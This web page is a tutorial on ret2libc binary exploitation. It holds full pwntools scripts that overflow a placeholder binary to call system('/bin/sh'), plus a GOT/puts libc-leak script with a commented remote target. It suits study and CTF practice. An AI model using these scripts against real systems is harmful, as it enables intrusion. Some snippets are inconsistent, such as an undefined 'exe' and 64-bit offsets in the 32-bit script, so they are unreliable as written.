<!DOCTYPE html>
<html lang="en" class="m-0 p-0 w-screen min-h-screen bg-navy-dark"><head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Binary Exploitation with ret2libc | Readloud.io</title>
        <meta name="description" content="ret2libc (return-to-libc) allows an attacker to redirect the program's flow of execution from the current function to a function in a shared library, sucy as libc, the standard C library. The goal of libc is to execute malicious code, such as shellcode, by calling the standard library functions, such as system() or execve().">
        
        <link rel="icon" type="image/x-icon" href="/img/favicon-32x32.png">
        <link rel="stylesheet" href="/pagefind/pagefind-ui.css"><link rel="stylesheet" href="/styles.css">
        <link rel="stylesheet" href="/css/carbonads.css">
        
        <script type="text/javascript" src="/js/exploit.js"></script>
        

        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:site" content="@readloud">
        <meta name="twitter:creator" content="@readloud">
        <meta property="og:url" content="https://readloud.github.io/exploit/binary-exploitation/method/binary-exploitation-with-ret2libc/">
        <meta property="og:title" content="Binary Exploitation with ret2libc | Readloud.io">
        <meta property="og:description" content="ret2libc (return-to-libc) allows an attacker to redirect the program's flow of execution from the current function to a function in a shared library, sucy as libc, the standard C library. The goal of libc is to execute malicious code, such as shellcode, by calling the standard library functions, such as system() or execve().">
        <meta property="og:image" content="/assets/img/inbox-zero-dark-377cc25a227f.svg">
        <meta name="google-site-verification" content="4qboBG2QwQ7ozdQXhighyX3ibD42zDxHnazVIx_7p7o">
        <script async="" src="https://www.googletagmanager.com/gtag/js?id=GTM-K6GHSK2"></script>
        <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'GTM-K6GHSK2');
        </script>
    <script type="text/javascript" src="/pagefind/pagefind-ui.js"></script><script type="text/javascript">window.addEventListener('DOMContentLoaded',()=>{new PagefindUI({"element":"#search","showImages":false,"excerptLength":0,"showEmptyFilters":true,"showSubResults":false,"resetStyles":true,"bundlePath":"/pagefind/","baseUrl":"/"});});</script><link rel="stylesheet" href="/codecopy/codecopy.css"><script type="text/javascript" src="/codecopy/codecopy.js"></script></head>

    <body class="relative w-screen min-h-screen text-basic text-white text-sm">
        <header class="sticky top-0 left-0 w-full z-20 bg-gradient-to-r from-pink-dark p-2">
    <div class="md:mx-auto w-full md:w-2/3 h-full flex justify-around items-center">
        <div class="
                w-full md:w-2/3 lg:w-1/2 h-full flex flex-col md:flex-row items-center
                md:gap-x-3 gap-y-3 md:gap-y-0
            ">
            <a href="/">
                <span class="text-sm text-white font-bold">
                    readloud
                </span>
            </a>
            
            <div id="search" class=""></div>
        </div>

        
        <div class="hidden sm:flex w-full h-full items-center justify-center gap-x-3">

            
            <a href="https://github.com/readloud" target="_blank" rel="noopener noreferrer" alt="GitHub">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" class="w-7 h-7 fill-white">
                    <path d="
                            M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207
                            11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729
                            1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304
                            3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381
                            1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399
                            3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242
                            2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823
                            1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"></path>
                </svg>
            </a>

            
            <a href="https://twitter.com/readloud" target="_blank" rel="noopener noreferrer" alt="Twitter">
                <img src="/img/x.png" alt="Twitter" width="22" height="22" class="w-6 h-6">
            </a>

            
            <a href="https://ko-fi.com/readloud" target="_blank" rel="noopener noreferrer" alt="Ko-fi">
                <img src="/img/kofi_cropped.png" alt="Ko-fi" width="22" height="22" class="w-10 h-10">
            </a>

        </div>
    </div>
</header>


<div class="hamburger fixed top-3 right-2 z-40 block md:hidden cursor-pointer">
    <div class="lines">
        <span class="line bg-white"></span>
        <span class="line bg-white"></span>
        <span class="line bg-white"></span>
    </div>
    <div class="line-cross hidden md:hidden text-[22px] text-white leading-none"></div>
</div>

<div id="search_bg" class="fixed top-0 left-0 w-screen z-10 h-screen hidden bg-black opacity-50"></div>

<style>
.hamburger .lines span.line {
    display: block;
    width: 20px;
    height: 3px;
    margin-bottom: 5px;
}

.hamburger .line-cross:before {
    content: '\2716';
}
</style>

<script>
    window.addEventListener('DOMContentLoaded', () => {
        //Display the black filter when searching
        const searchBgElem = document.getElementById("search_bg");
        const drawerElem = document.querySelector(".pagefind-ui__drawer");
        const inputElem = document.querySelector(".pagefind-ui__search-input");

        if (searchBgElem) {
            searchBgElem.addEventListener('click', () => {
                searchBgElem.classList.add("hidden");
                drawerElem.style.visibility = "hidden";
                drawerElem.style.opacity = 0;
            });
        }

        inputElem.addEventListener('focus', () => {
            if (searchBgElem) {
                searchBgElem.classList.remove("hidden");
                drawerElem.style.visibility = "visible";
                drawerElem.style.opacity = 1;
            }
        });
    });
</script>

        <nav class="nav-links hidden">
    <div class="w-full flex flex-col gap-y-4">
        <div>
            <h3 class="my-4 text-base text-white opacity-60">SOCIAL</h3>
            <div class="w-full flex flex-col gap-y-1">
                <a href="https://github.com/readloud" target="_blank" rel="noopener noreferrer" class="text-lg">
                    GitHub
                </a>
                <a href="https://twitter.com/readloud" target="_blank" rel="noopener noreferrer" class="text-lg">
                    Twitter
                </a>
                <a href="https://ko-fi.com/readloud" target="_blank" rel="noopener noreferrer" class="text-lg">
                    
                    Support Me
                </a>
            </div>
        </div>
        <div>
            <h3 class="my-4 text-base text-white opacity-60">PAGES</h3>
            <div class="w-full flex flex-col gap-y-1">
                <a href="/disclaimer" class="text-lg">
                    Disclaimer
                </a>
            </div>
            <div class="w-full flex flex-col gap-y-1">
                <a href="/privacy-policy" class="text-lg">
                    Privacy Policy
                </a>
            </div>
        </div>
        <div>
            <h3 class="my-4 text-base text-white opacity-60">OTHER TOOLS</h3>
            <div class="w-full flex flex-col gap-y-1">
                <a href="https://github.com/readloud?tab=repositories" target="_blank" rel="noopener noreferrer" class="text-lg">
                    Repositories
                </a>
                <a href="https://readloud.github.io/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E" target="_blank" rel="noopener noreferrer" class="text-lg">
                    Advanced PeneTest 4E
                </a>
                <a href="https://readloud.github.io/index-of-ISO" target="_blank" rel="noopener noreferrer" class="text-lg">
                    ISO Archive
                </a>
                <a href="https://readloud.github.io/faucetmonitor" target="_blank" rel="noopener noreferrer" class="text-lg">
                    Faucetmonitor
                </a>
            </div>
        </div>
    </div>
</nav>

<style>
    /* Navigation for mobile */
    .nav-links-hamburger {
        position: fixed;
        top: 0;
        right: 0;
        z-index: 30;
        width: 100vw;
        height: 100vh;
        min-height: 100vh;
        background-color: var(--color-slate-dark);
        padding: 60px 32px;
        display: flex;
        flex-direction: column;
        align-items: flex-start;
        justify-content: flex-start;
        gap: 32px 0px;
        color: var(--color-khaki);
    }
</style>

        <main class="w-full h-full">
            <div class="block sm:grid grid-cols-[320px_minmax(400px,_1fr)_280px] py-2">

    
    <div id="exploit-leftside-inner" class="hidden sm:block w-full h-screen overflow-y-auto px-4 py-3">
        <div class="w-full">
            <div id="exploit-related">
                
                    <h4 class="mb-4 border-b-2 border-slate-light text-base text-white opacity-80">
                        Method
                    </h4>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/method/binary-exploitation-with-buffer-overflow/" class="text-sm text-pink-light hover:brightness-200">
                                Binary Exploitation with Buffer Overflow
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/method/binary-exploitation-with-canary-bypass/" class="text-sm text-pink-light hover:brightness-200">
                                Binary Exploitation with Canary Bypass
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/method/binary-exploitation-with-format-string/" class="text-sm text-pink-light hover:brightness-200">
                                Binary Exploitation with Format String
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/method/binary-exploitation-with-got/" class="text-sm text-pink-light hover:brightness-200">
                                Binary Exploitation with GOT
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/method/binary-exploitation-with-rop/" class="text-sm text-pink-light hover:brightness-200">
                                Binary Exploitation with ROP
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/method/binary-exploitation-with-race-conditions/" class="text-sm text-pink-light hover:brightness-200">
                                Binary Exploitation with Race Conditions
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/method/binary-exploitation-with-time-guessing/" class="text-sm text-pink-light hover:brightness-200">
                                Binary Exploitation with Time Guessing
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <span id="scroll-target" class="text-sm text-white">Binary Exploitation with ret2libc</span>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/method/binary-exploitation-with-ret2plt/" class="text-sm text-pink-light hover:brightness-200">
                                Binary Exploitation with ret2plt
                            </a>
                        
                        </div>
                    

                    
                
                    <h4 class="mb-4 border-b-2 border-slate-light text-base text-white opacity-80">
                        Cheatsheet
                    </h4>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/cheatsheet/pwntools-cheat-sheet/" class="text-sm text-pink-light hover:brightness-200">
                                Pwntools Cheat Sheet
                            </a>
                        
                        </div>
                    

                    
                
                    <h4 class="mb-4 border-b-2 border-slate-light text-base text-white opacity-80">
                        Binary Exploitation
                    </h4>
                    

                    
                        
                            <div class="my-3">
                            
                                <a href="/exploit/binary-exploitation/" class="text-sm text-pink-light hover:brightness-200">
                                    Binary Exploitation
                                </a>
                            
                            </div>
                        
                    
                
            </div>
        </div>
    </div>
    

    <div id="exploit-center-inner" class="w-full h-screen overflow-y-auto px-2 md:px-6 py-3" data-pagefind-body="">
        <article>
            <div class="w-full p-4">
                <h1 id="exploit-title" class="text-4xl font-bold">Binary Exploitation with ret2libc</h1>
                <p class="my-3 text-base">Last modified: 2023-08-14</p>

                
                <div class="my-3 flex flex-wrap items-end space-x-2 space-y-2">
                    
                    <span class="bg-pink-dark rounded-md text-base px-3 py-1 text-white">Reverse Engineering</span>
                    
                </div>
                
            </div>

            <hr class="border-1 border-white opacity-40">

            <p class="px-2 py-4 text-base">ret2libc (return-to-libc) allows an attacker to redirect the program's flow of execution from the current function to a function in a shared library, sucy as libc, the standard C library. The goal of libc is to execute malicious code, such as shellcode, by calling the standard library functions, such as system() or execve().</p>

            <div id="exploit-content" class="px-2 py-4 text-base">
                <h2 id="exploitation" tabindex="-1"><a href="#exploitation" class="header-anchor">Exploitation</a></h2>
<h3 id="1.-aslr-bypass" tabindex="-1"><a href="#1.-aslr-bypass" class="header-anchor">1. ASLR Bypass</a></h3>
<p>First check the ASLR in the machine.</p>
<pre class="codecopy_pre codecopy_pre_0"><code class="language-bash hljs"><span class="hljs-built_in">cat</span> /proc/sys/kernel/randomize_va_space
</code><button class="codecopy_copy" data-codecopy="0">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>If we get <strong>"2"</strong> as the result, the machine randomizes the address space so we cannot find the address of the system function. That’s why we need to bypass ASLR to find the address of the function in libc.</p>
<p>To disable ASLR, run the following command if we can (because it requires sudo).</p>
<pre class="codecopy_pre codecopy_pre_1"><code class="language-bash hljs"><span class="hljs-built_in">echo</span> 0 | sudo <span class="hljs-built_in">tee</span> /proc/sys/kernel/randomize_va_space
</code><button class="codecopy_copy" data-codecopy="1">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="2.-find-libc-in-the-binary" tabindex="-1"><a href="#2.-find-libc-in-the-binary" class="header-anchor">2. Find libc in the Binary</a></h3>
<pre class="codecopy_pre codecopy_pre_2"><code class="language-bash hljs">ldd ./example

<span class="hljs-comment"># Result examples</span>
linux-vdso.so.1 (0x00007ffff7ffa000)
libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)
</code><button class="codecopy_copy" data-codecopy="2">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>For instance, we found the libc.so.6 and the base address of libc is <code>0x00007ffff79e2000</code>.</p>
<h3 id="3.-find-the-location-of-libc" tabindex="-1"><a href="#3.-find-the-location-of-libc" class="header-anchor">3. Find the Location of libc</a></h3>
<pre class="codecopy_pre codecopy_pre_3"><code class="language-bash hljs"><span class="hljs-comment"># -s: Display the symbols</span>
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system

<span class="hljs-comment"># Result</span>
1403: 000000000004f550    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
</code><button class="codecopy_copy" data-codecopy="3">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="4.-find-the-location-of-%2Fbin%2Fsh" tabindex="-1"><a href="#4.-find-the-location-of-%2Fbin%2Fsh" class="header-anchor">4. Find the Location of /bin/sh</a></h3>
<pre class="codecopy_pre codecopy_pre_4"><code class="language-bash hljs"><span class="hljs-comment"># -a: All scan</span>
<span class="hljs-comment"># -t x: Print the location of the string in hex (x) </span>
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh

<span class="hljs-comment"># Result</span>
1b3e1a /bin/sh
</code><button class="codecopy_copy" data-codecopy="4">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="5.-craft-payload" tabindex="-1"><a href="#5.-craft-payload" class="header-anchor">5. Craft Payload</a></h3>
<p>Replace the values of libc_base, system, binsh with the values which we found in the previous sections.</p>
<ul>
<li>
<p><strong>32-bit</strong></p>
<pre class="codecopy_pre codecopy_pre_5"><code class="language-python hljs"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

p = process(<span class="hljs-string">'./example'</span>)

libc_base = <span class="hljs-number">0xf7dc2000</span>
system = libc_base + <span class="hljs-number">0x4f550</span>
binsh = libc_base + <span class="hljs-number">0x1b3e1a</span>

payload = <span class="hljs-string">b'A'</span> * <span class="hljs-number">76</span>         <span class="hljs-comment"># The padding</span>
payload += p32(system)      <span class="hljs-comment"># Location of system</span>
payload += p32(<span class="hljs-number">0x0</span>)         <span class="hljs-comment"># return pointer - not important once we get the shell</span>
payload += p32(binsh)       <span class="hljs-comment"># pointer to command: /bin/sh</span>

p.clean()
p.sendline(payload)
p.interactive()
</code><button class="codecopy_copy" data-codecopy="5">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
</li>
<li>
<p><strong>64-bit</strong></p>
<p>In 64-bit, we need to find the address of <strong><code>pop rdi ; ret</code></strong>.</p>
<ul>
<li>
<p><strong>Get POP RDI using Pwntools</strong></p>
<p>We can easily do that using <strong><code>ROP</code></strong> method of <strong>pwntools</strong> as below.</p>
<pre class="codecopy_pre codecopy_pre_6"><code class="language-python hljs">rop = ROP(exe)
POP_RDI = (rop.find_gadget([<span class="hljs-string">'pop rdi'</span>, <span class="hljs-string">'ret'</span>]))[<span class="hljs-number">0</span>]
<span class="hljs-built_in">print</span>(<span class="hljs-string">"pop rdi: "</span>, <span class="hljs-built_in">hex</span>(POP_RDI))
</code><button class="codecopy_copy" data-codecopy="6">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
</li>
<li>
<p><strong>Get POP RDI using ROPgadget</strong></p>
<p>Alternatively, <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> can be used.</p>
<pre class="codecopy_pre codecopy_pre_7"><code class="language-bash hljs">ROPgadget --binary ./example | grep rdi

<span class="hljs-comment"># Result</span>
0x00000000004007f3 : pop rdi ; ret
</code><button class="codecopy_copy" data-codecopy="7">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>In some cases, we might need to the return address for paddings.</p>
<pre class="codecopy_pre codecopy_pre_8"><code class="language-python hljs">objdump -d ./example | grep ret

<span class="hljs-comment"># Result</span>
<span class="hljs-number">400556</span>:	c3                   	retq
</code><button class="codecopy_copy" data-codecopy="8">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
</li>
</ul>
<p>Finally our script is below:</p>
<pre class="codecopy_pre codecopy_pre_9"><code class="language-python hljs"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

p = process(<span class="hljs-string">'./example'</span>)

libc_base = <span class="hljs-number">0x7ffff7de2000</span>
system = libc_base + <span class="hljs-number">0x4f550</span>
binsh = libc_base + <span class="hljs-number">0x1b3e1a</span>

rop = ROP(exe)
POP_RDI = (rop.find_gadget([<span class="hljs-string">'pop rdi'</span>, <span class="hljs-string">'ret'</span>]))[<span class="hljs-number">0</span>]

payload = <span class="hljs-string">b'A'</span> * <span class="hljs-number">72</span>         <span class="hljs-comment"># The padding</span>
<span class="hljs-comment"># payload += p64(0x400556)    # Extra paddings</span>
payload += p64(POP_RDI)     <span class="hljs-comment"># gadget -&gt; pop rdi; ret</span>
payload += p64(binsh)       <span class="hljs-comment"># pointer to command: /bin/sh</span>
payload += p64(system)      <span class="hljs-comment"># Location of system</span>
payload += p64(<span class="hljs-number">0x0</span>)         <span class="hljs-comment"># return pointer - not important once we get the shell</span>

<span class="hljs-comment"># If we need to input in multiple prompts, </span>
<span class="hljs-comment"># p.clean()</span>
<span class="hljs-comment"># p.sendline("1") e.g. "Select the menu:"</span>
p.clean()
p.sendline(payload)
p.interactive()
</code><button class="codecopy_copy" data-codecopy="9">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
</li>
</ul>
<h3 id="6.-optional%3A-leaking-libc-address" tabindex="-1"><a href="#6.-optional%3A-leaking-libc-address" class="header-anchor">6. Optional: Leaking libc Address</a></h3>
<p>If we need to find <strong><code>libc</code></strong> address dynamically, we may be able to leak the address by</p>
<pre class="codecopy_pre codecopy_pre_10"><code class="language-python hljs">exe = <span class="hljs-string">"./example"</span>
elf = context.binary = ELF(exe)
libc = elf.libc

conn = process(elf)
<span class="hljs-comment"># conn = remote("10.0.0.1", "1234")</span>

<span class="hljs-comment"># Find gadgets</span>
rop = ROP(exe)
POP_RDI = (rop.find_gadget([<span class="hljs-string">'pop rdi'</span>, <span class="hljs-string">'ret'</span>]))[<span class="hljs-number">0</span>]
GOT_FUNC = elf.got[<span class="hljs-string">'puts'</span>] <span class="hljs-comment"># e.g. desired function is `puts`</span>
PLT_PUTS = elf.plt[<span class="hljs-string">'puts'</span>]
SYM_FUNC = elf.sym[<span class="hljs-string">'main'</span>] <span class="hljs-comment"># specific function name in which the payload is executed e.g. `main`.</span>

padding = <span class="hljs-number">0x12</span>

<span class="hljs-comment"># Send gadgets</span>
payload = <span class="hljs-string">b"A"</span> * padding
payload += p64(POP_RDI)
payload += p64(GOT_FUNC)
payload += p64(PLT_PUTS)
payload += p64(SYM_FUNC)

conn.sendlineafter(<span class="hljs-string">b"&gt;"</span>, payload)

<span class="hljs-comment"># Extract leaked libc address</span>
leaked_line = conn.recvline()
leaked_libc = unpack(leaked_line.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>))
<span class="hljs-built_in">print</span>(<span class="hljs-string">"Leaked libc address: "</span>, <span class="hljs-built_in">hex</span>(leaked_libc))

<span class="hljs-comment"># Get the system and /bin/sh addresses</span>
libc_base = leaked_libc - libc.sym[<span class="hljs-string">'puts'</span>]
system = libc_base + libc.sym[<span class="hljs-string">'system'</span>]
binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b'/bin/sh'</span>))

<span class="hljs-comment"># Send the final payload</span>
payload = <span class="hljs-string">b"A"</span> * padding
payload += p64(POP_RDI)
payload += p64(binsh)
payload += p64(system)

conn.sendlineafter(<span class="hljs-string">b"&gt;"</span>, payload)

conn.interactive()
</code><button class="codecopy_copy" data-codecopy="10">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>

            </div>

            
